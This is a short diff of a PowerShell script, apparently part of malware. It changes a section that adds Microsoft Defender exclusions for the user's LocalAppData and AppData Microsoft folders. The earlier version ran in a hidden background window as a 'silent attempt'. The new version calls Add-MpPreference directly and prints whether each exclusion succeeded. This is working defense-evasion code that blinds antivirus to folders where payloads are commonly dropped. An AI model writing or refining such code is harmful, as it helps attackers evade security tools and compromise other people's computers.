@@ -91,11 +91,16 @@ try {
     }
 } catch {}
 
-# === DEFENDER EXCLUSION (silent attempt) ===
+# === DEFENDER EXCLUSION (Direct Admin Attempt) ===
 try {
     $exPaths = @($env:LOCALAPPDATA, "$env:LOCALAPPDATA\Microsoft", "$env:APPDATA\Microsoft")
     foreach ($ep in $exPaths) {
-        Start-Process 'powershell' -ArgumentList "-NoP -NonI -W Hidden -Command `"Add-MpPreference -ExclusionPath '$ep' -EA 0`"" -WindowStyle Hidden -EA 0
+        try {
+            Add-MpPreference -ExclusionPath $ep -ErrorAction Stop
+            Write-Host "[+] Defender Exclusion Added: $ep"
+        } catch {
+            Write-Host "[!] Defender Exclusion Failed for $ep : $($_.Exception.Message)"
+        }
     }
 } catch {}
 
